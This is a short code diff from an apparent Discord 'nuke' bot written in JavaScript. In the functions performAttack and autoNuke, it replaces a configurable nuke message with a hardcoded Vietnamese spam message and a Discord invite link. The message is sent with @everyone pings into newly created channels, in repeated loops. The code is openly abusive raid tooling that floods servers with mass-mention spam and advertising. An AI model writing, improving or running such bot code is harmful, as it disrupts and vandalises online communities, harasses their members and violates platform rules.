@@ -138,7 +138,7 @@ async function performAttack(guild, config) {
     const spamPromises = [];
     for (let i = 0; i < 5; i++) {
         for (const channel of newChannels) {
-            spamPromises.push(channel.send(`${channel.name} @everyone ${config.nukeMessage}`).catch(console.error));
+            spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
         }
     }
     await Promise.all(spamPromises);
@@ -153,7 +153,7 @@ async function autoNuke(guild, config) {
         const spamPromises = [];
         for (const channel of newChannels.values()) {
             if (channel.isTextBased()) {
-                spamPromises.push(channel.send(`@everyone ${config.nukeMessage}`).catch(console.error));
+                spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
             }
         }
         await Promise.all(spamPromises);
